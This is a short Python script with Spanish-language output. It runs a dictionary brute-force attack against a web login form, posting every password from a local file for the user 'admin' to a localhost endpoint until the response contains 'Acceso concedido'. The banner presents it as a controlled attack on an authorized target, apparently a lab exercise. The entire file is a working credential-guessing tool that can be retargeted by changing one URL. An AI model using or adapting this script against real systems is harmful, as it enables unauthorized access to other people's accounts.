import urllib.parse
import urllib.request
import time

URL = "http://127.0.0.1:8080/login"
USUARIO = "admin"
ARCHIVO_PASSWORDS = "passwords.txt"

print("=== Ataque controlado de fuerza bruta ===")
print("Objetivo autorizado:", URL)
print("Usuario objetivo:", USUARIO)
print("----------------------------------------")

with open(ARCHIVO_PASSWORDS, "r") as archivo:
    passwords = archivo.read().splitlines()

for password in passwords:
    datos = urllib.parse.urlencode({
        "usuario": USUARIO,
        "password": password
    }).encode()

    peticion = urllib.request.Request(URL, data=datos, method="POST")

    try:
        respuesta = urllib.request.urlopen(peticion)
        contenido = respuesta.read().decode(errors="ignore")

        print(f"Probando contraseña: {password}")

        if "Acceso concedido" in contenido:
            print("----------------------------------------")
            print("[+] Contraseña encontrada:", password)
            print("[+] Ataque finalizado")
            break
        else:
            print("[-] Acceso denegado")

    except Exception as error:
        print("[!] Error:", error)

    time.sleep(1)